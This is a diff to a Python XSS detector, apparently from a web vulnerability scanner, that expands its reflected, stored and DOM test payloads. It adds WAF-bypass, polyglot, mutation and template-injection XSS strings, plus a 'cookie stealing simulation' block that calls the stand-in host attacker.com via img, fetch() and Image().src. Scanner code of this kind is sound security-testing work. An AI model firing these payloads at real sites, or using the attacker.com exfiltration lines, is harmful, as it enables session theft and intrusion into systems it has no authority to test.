@@ -82,35 +82,84 @@ class XSSDetector:
         return result
     
     def _test_reflected(self, url: str, param: str) -> List[Dict]:
-        """Test for reflected XSS"""
+        """Test for reflected XSS with modern payloads"""
         vulns = []
         
-        # XSS payloads - simple to complex
+        # Modern XSS payloads - advanced evasion techniques
         payloads = [
-            # Basic script tag
-            '<script>alert(1)</script>',
-            '<img src=x onerror=alert(1)>',
-            '<svg onload=alert(1)>',
+            # === BASIC PAYLOADS (for initial detection) ===
+            '<script>alert(document.domain)</script>',
+            '<img src=x onerror=alert(document.cookie)>',
+            '<svg onload=alert(window.origin)>',
             
-            # Event handlers
-            '"><script>alert(1)</script>',
-            '\'><script>alert(1)</script>',
-            '" onload="alert(1)',
-            '\' onload=\'alert(1)',
+            # === CONTEXT BREAKING PAYLOADS ===
+            # Break out of HTML attributes
+            '" autofocus onfocus=alert(document.domain)//',
+            "' autofocus onfocus=alert(document.domain)//",
+            '">><marquee onstart=alert(document.domain)>',
             
-            # Bypass quotes
-            '<script>alert(String.fromCharCode(88,83,83))</script>',
-            '"><img src=x onerror=alert(1)>',
+            # Break out of JavaScript context
+            '</script><script>alert(document.domain)</script>',
+            "'-alert(document.domain)-'",
+            "';alert(String.fromCharCode(88,83,83))//",
             
-            # DOM events
-            '<body onload=alert(1)>',
-            '<input onfocus=alert(1) autofocus>',
-            '<textarea onfocus=alert(1) autofocus>',
+            # === WAF BYPASS TECHNIQUES ===
+            # Case variation
+            '<ScRiPt>alert(document.domain)</sCrIpT>',
+            '<IMG SRC=x ONERROR=alert(document.domain)>',
+            '<SVG ONLOAD=alert(document.domain)>',
             
-            # HTML5
-            '<video src=x onerror=alert(1)>',
-            '<audio src=x onerror=alert(1)>',
-            '<iframe src=x onerror=alert(1)>',
+            # Encoding bypass
+            '<script\\x20type="text/javascript">alert(document.domain)</script>',
+            '<script\\x0D>alert(document.domain)</script>',
+            '<script\\x0A>alert(document.domain)</script>',
+            
+            # Unicode bypass
+            '<\\x73\\x63\\x72\\x69\\x70\\x74>alert(document.domain)</\\x73\\x63\\x72\\x69\\x70\\x74>',
+            '\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e',
+            
+            # Null byte bypass
+            '<script\\x00>alert(document.domain)</script>',
+            '<img src=x onerror\\x00=alert(document.domain)>',
+            
+            # === DOUBLE ENCODING ===
+            '%253Cscript%253Ealert(document.domain)%253C/script%253E',
+            '%253cscript%253ealert(document.domain)%253c/script%253e',
+            
+            # === POLYGLOT PAYLOADS (work in multiple contexts) ===
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert(document.domain))//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e",
+            
+            # === DOM-BASED PAYLOADS ===
+            '<img src=x onerror=this.innerHTML=\'<script>alert(document.domain)</script>\'>',
+            '<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>',
+            
+            # === MUTATION-BASED XSS ===
+            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(document.domain)>',
+            '<noscript><img src=x onerror=alert(document.domain)>',
+            
+            # === TEMPLATE INJECTION PAYLOADS ===
+            '{{constructor.constructor("alert(document.domain)")()}}',
+            '${alert(document.domain)}',
+            '<%=alert(document.domain)%>',
+            
+            # === ADVANCED EVENT HANDLERS ===
+            '<details open ontoggle=alert(document.domain)>',
+            '<xss onafterscriptexecute=alert(document.domain)><script>1</script>',
+            '<xss onbeforescriptexecute=alert(document.domain)><script>1</script>',
+            '<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))>',
+            
+            # === COOKIE STEALING SIMULATION ===
+            '<img src="http://attacker.com/?c=cookie_test">',
+            '<script>fetch("http://attacker.com/?c=test")</script>',
+            '<script>new Image().src="http://attacker.com/?c=test";</script>',
+            
+            # === REFLECTED XSS WITH FILTERS ===
+            # Bypass word filters
+            '<scr<script>ipt>alert(document.domain)</scr</script>ipt>',
+            '<<script>script>alert(document.domain)<</script>/script>',
+            
+            # Bypass tag filters
+            '<img src=x onerror=eval(atob("ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgxKT4n"))>',
         ]
         
         for payload in payloads:
@@ -135,13 +184,26 @@ class XSSDetector:
         return vulns
     
     def _test_stored(self, url: str, param: str) -> List[Dict]:
-        """Test for stored XSS"""
+        """Test for stored XSS with modern payloads"""
         vulns = []
         
-        # Try POST with XSS payload
+        # Modern stored XSS payloads
         payloads = [
-            '<script>alert(1)</script>',
-            '<img src=x onerror=alert(1)>',
+            # Basic payloads
+            '<script>alert(document.domain)</script>',
+            '<img src=x onerror=alert(document.cookie)>',
+            
+            # Advanced payloads
+            '<svg onload=alert(document.domain)>',
+            '<body onload=alert(document.domain)>',
+            
+            # WAF bypass
+            '<ScRiPt>alert(document.domain)</sCrIpT>',
+            '<IMG SRC=x ONERROR=alert(document.domain)>',
+            
+            # Mutation-based
+            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(document.domain)>',
+            '<noscript><img src=x onerror=alert(document.domain)>',
         ]
         
         for payload in payloads:
@@ -167,25 +229,75 @@ class XSSDetector:
         return vulns
     
     def _test_dom(self, url: str) -> List[Dict]:
-        """Test for DOM-based XSS"""
+        """Test for DOM-based XSS with modern payloads"""
         vulns = []
         
-        try:
-            # Try URL fragment
-            test_url = f"{url}#<img src=x onerror=alert(1)>"
-            resp = self.http_client.get(test_url, timeout=self.timeout)
+        # Modern DOM XSS payloads
+        dom_payloads = [
+            # Basic fragment injection
+            '#<img src=x onerror=alert(document.domain)>',
+            '#<svg onload=alert(document.domain)>',
             
-            # Check for DOM manipulation
-            if 'eval(' in resp.text or 'innerHTML' in resp.text or 'document.write' in resp.text:
-                vulns.append({
-                    'type': 'dom',
-                    'indicator': 'DOM manipulation found',
-                    'confidence': 'medium'
-                })
-                logger.info(f"[XSS] DOM XSS potential found")
+            # Hash-based payloads
+            '#<script>alert(document.domain)</script>',
+            '#javascript:alert(document.domain)',
+            
+            # DOM sink payloads
+            '#<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))>',
+            '#<img src=x onerror=this.innerHTML=\'<script>alert(document.domain)</script>\'>',
+            
+            # Advanced DOM payloads
+            '#<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>',
+            '#<details open ontoggle=alert(document.domain)>',
+            
+            # Template injection
+            '#{{constructor.constructor("alert(document.domain)")()}}',
+            '#${alert(document.domain)}',
+        ]
         
-        except Exception as e:
-            logger.debug(f"[XSS] DOM test failed: {e}")
+        for payload in dom_payloads:
+            try:
+                test_url = f"{url}{payload}"
+                resp = self.http_client.get(test_url, timeout=self.timeout)
+                
+                # Check for DOM manipulation sinks
+                dom_sinks = [
+                    'eval(',
+                    'innerHTML',
+                    'document.write',
+                    'outerHTML',
+                    'insertAdjacentHTML',
+                    'dangerouslySetInnerHTML',
+                    '$(\'',
+                    '.html(',
+                    'document.createElement',
+                    'appendChild',
+                ]
+                
+                found_sinks = [sink for sink in dom_sinks if sink in resp.text]
+                if found_sinks:
+                    vulns.append({
+                        'type': 'dom',
+                        'payload': payload,
+                        'indicator': f'DOM sinks found: {", ".join(found_sinks)}',
+                        'confidence': 'medium'
+                    })
+                    logger.info(f"[XSS] DOM XSS potential found with sinks: {found_sinks}")
+                    break
+                
+                # Also check if payload is reflected in JavaScript context
+                if payload.lstrip('#') in resp.text:
+                    vulns.append({
+                        'type': 'dom',
+                        'payload': payload,
+                        'indicator': 'Payload reflected in response',
+                        'confidence': 'low'
+                    })
+                    logger.info(f"[XSS] DOM XSS potential - payload reflected")
+                    break
+        
+            except Exception as e:
+                logger.debug(f"[XSS] DOM test failed: {e}")
         
         return vulns
     
